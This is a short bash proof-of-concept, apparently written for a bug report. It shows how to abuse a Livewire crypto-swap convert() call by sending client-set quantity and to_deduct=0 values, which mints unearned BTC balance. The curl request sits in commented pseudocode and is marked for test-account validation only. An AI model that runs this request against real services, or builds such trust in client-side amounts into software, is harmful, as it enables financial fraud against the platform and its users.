#!/bin/bash
# CRITICAL: convert() mints crypto from thin air. Authentication required.
# 1. Get a wire:snapshot for user.crypto-swapping.conversion from the
#    /user/crypto-swap/convert/BTC page.
# 2. Send the request below.
# 3. The server returns 302 -> /user/crypto-swap/assets and the user's BTC
#    balance is incremented by the supplied quantity.
#
# DO NOT RUN unless you intend to validate the bug on a test account.
# Each successful run mints further fake balance.

# Pseudocode:
# CSRF=$(curl -c jar -b jar https://target/user/dashboard | grep csrf-token | sed ...)
# SNAP=$(curl -c jar -b jar https://target/user/crypto-swap/convert/BTC | grep -o 'wire:snapshot=...' | sed ...)
# curl -c jar -b jar -X POST https://target/livewire/update \
#   -H 'Content-Type: application/json' \
#   --data-binary "{\"_token\":\"$CSRF\",\"components\":[{\"snapshot\":\"$SNAP\",\"updates\":{\"from_amount\":\"100\",\"to_amount\":\"100\",\"quantity\":\"100\",\"to_deduct\":\"0\"},\"calls\":[{\"path\":\"\",\"method\":\"convert\",\"params\":[]}]}]}"

# Then GET https://target/user/crypto-swap/assets and check the BTC balance row.
